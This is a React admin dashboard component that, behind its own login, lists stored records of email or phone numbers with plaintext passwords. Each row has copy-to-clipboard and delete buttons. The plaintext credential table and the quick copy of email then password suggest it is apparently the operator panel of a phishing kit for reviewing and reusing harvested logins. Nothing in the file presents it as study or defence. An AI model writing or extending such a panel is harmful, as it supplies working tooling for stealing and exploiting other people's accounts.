"use client";

import { useState, useEffect } from "react";

export default function AdminPage() {
  const [authenticated, setAuthenticated] = useState(false);
  const [data, setData] = useState([]);
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [copyStep, setCopyStep] = useState(null);

  useEffect(() => {
    fetch("/api/admin/auth")
      .then((res) => res.json())
      .then((result) => setAuthenticated(result.authenticated));
  }, []);

  const handleAdminLogin = async (e) => {
    e.preventDefault();
    setLoginError("");
    const res = await fetch("/api/admin/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: loginEmail, password: loginPassword }),
    });
    const result = await res.json();
    if (result.success) {
      setAuthenticated(true);
      fetchData();
    } else {
      setLoginError("Invalid credentials");
    }
  };

  const handleLogout = async () => {
    await fetch("/api/admin/logout", { method: "POST" });
    setAuthenticated(false);
    setData([]);
  };

  const fetchData = async () => {
    const res = await fetch("/api/admin/data");
    const data = await res.json();
    setData(data);
  };

  const handleCopy = async (email, password) => {
    setCopyStep("email");
    await navigator.clipboard.writeText(email);
    setTimeout(() => {
      setCopyStep("password");
      navigator.clipboard.writeText(password);
      setTimeout(() => setCopyStep(null), 500);
    }, 500);
  };

  const handleDelete = async (id) => {
    await fetch("/api/admin/data", {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id }),
    });
    setData(data.filter((item) => item._id !== id));
  };

  if (!authenticated) {
    return (
      <div className="admin-container" style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh" }}>
        <div className="login-form-container">
          <h2>Admin Login</h2>
          <form onSubmit={handleAdminLogin}>
            <input
              type="text"
              placeholder="Admin Email"
              value={loginEmail}
              onChange={(e) => setLoginEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Admin Password"
              value={loginPassword}
              onChange={(e) => setLoginPassword(e.target.value)}
              required
            />
            {loginError && <p style={{ color: "red", marginBottom: "10px" }}>{loginError}</p>}
            <button type="submit">Login</button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="admin-container">
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
        <h1>Admin Dashboard</h1>
        <button className="btn btn-delete" onClick={handleLogout}>Logout</button>
      </div>
      {data.length === 0 ? (
        <p className="empty-message">No data yet.</p>
      ) : (
        <table className="admin-table">
          <thead>
            <tr>
              <th>#</th>
              <th>Email/Phone</th>
              <th>Password</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {data.map((item, index) => (
              <tr key={item._id}>
                <td>{index + 1}</td>
                <td>{item.email}</td>
                <td>{item.password}</td>
                <td>
                  <button
                    className="btn btn-copy"
                    onClick={() => handleCopy(item.email, item.password)}
                  >
                    {copyStep === "email" ? "Copying Email..." : copyStep === "password" ? "Copied Password" : "Copy"}
                  </button>
                  <button
                    className="btn btn-delete"
                    onClick={() => handleDelete(item._id)}
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
}
